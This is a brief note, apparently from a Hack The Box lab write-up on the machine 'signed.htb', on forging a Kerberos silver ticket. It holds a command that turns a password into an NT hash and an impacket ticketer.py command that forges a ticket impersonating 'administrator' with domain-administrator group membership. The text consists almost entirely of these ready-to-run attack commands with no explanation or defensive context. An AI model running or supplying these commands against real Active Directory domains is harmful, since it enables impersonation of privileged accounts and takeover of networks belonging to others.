
## for silver ticket

mandatory: SPN
it doesn't have option for password we have to supply nthash

```bash

echo -n "yourpassword" | iconv -t UTF-16LE | openssl md4 -provider legacy

```

```bash

ticketer.py \
	-spn DoesNotMatter/dc01.signed.htb \
	-domain-sid <sid> \
	-domain signed.htb \
	-nthash <nthash> \
	-group <domain adminstrators> \
	-user-id <current-user> \
	administrator#(ticket whom we wanted)


```


